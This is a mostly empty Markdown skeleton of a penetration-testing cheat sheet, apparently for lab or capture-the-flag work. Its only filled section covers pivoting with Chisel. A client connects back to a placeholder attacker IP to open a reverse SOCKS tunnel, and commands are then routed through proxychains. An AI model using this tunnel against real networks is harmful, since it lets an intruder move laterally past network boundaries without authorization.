# Reconnaissance

  <details>
    <summary>Nmap</summary>

  </details>

  <details>
    <summary>Banner Grabbing</summary>
  </details>

  <details>
    <summary>enum4linux</summary>

  </details>

</details>

# Exploitation</strong></summary>

# WebApp

# Pivoting

<details>
  <summary> Chisel </summary> 

  ### Creating a server
  ```shell
  chisel server --port <PORT> --reverse
  ```

  ### Edit /etc/proxychains4.conf
  ```shell
  [ProxyList]
  socks5 127.0.0.1 1080
  ```

  ### Connecting from the client

   ```shell
  .\chisel client <ATTACK_MACHINE_IP>:<PORT> R:socks
  ```

  ### Sending command via the tunnel
  ```shell
  proxychains -q <command>
  ```

</details> 

# File Transfers

# Windows 

# Linux
